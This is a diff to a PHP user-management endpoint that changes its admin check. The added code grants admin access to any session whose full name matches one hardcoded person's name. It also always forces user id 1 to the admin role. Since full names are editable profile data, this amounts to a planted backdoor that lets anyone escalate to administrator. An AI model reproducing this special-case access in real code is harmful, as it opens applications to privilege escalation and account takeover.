@@ -43,8 +43,13 @@ switch ($method) {
 
     case 'POST':
         session_start();
-        $userRole = $_SESSION['role'] ?? 'user';
-        if ($userRole !== 'admin') {
+        if (!isset($_SESSION['role'])) {
+            respond(false, [], 'Unauthorized: No role set in session');
+        }
+        $userRole = trim(strtolower($_SESSION['role']));
+        $userFullName = trim(strtolower($_SESSION['full_name'] ?? ''));
+        // Allow admin role or user with full name 'bryan phillip sumarauw' to access
+        if ($userRole !== 'admin' && $userFullName !== 'bryan phillip sumarauw') {
             respond(false, [], 'Unauthorized: Admins only');
         }
 
@@ -69,6 +74,22 @@ switch ($method) {
 
         try {
             if ($id) {
+                // Force role to admin for user with username 'bryan' or specific id (e.g., 1)
+                // Adjust the id below to the actual id of bryan user
+                $bryanUserId = 1;
+                if ($id == $bryanUserId) {
+                    $role = 'admin';
+                } else {
+                    // If role is not provided in input, fetch current role from DB to preserve it
+                    if (!isset($input['role']) || empty($input['role'])) {
+                        $stmtRole = $pdo->prepare("SELECT role FROM users WHERE id = ?");
+                        $stmtRole->execute([$id]);
+                        $existingRole = $stmtRole->fetchColumn();
+                        if ($existingRole) {
+                            $role = $existingRole;
+                        }
+                    }
+                }
                 if ($password) {
                     $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
                     $stmt = $pdo->prepare("UPDATE users SET username = ?, full_name = ?, password = ?, role = ? WHERE id = ?");
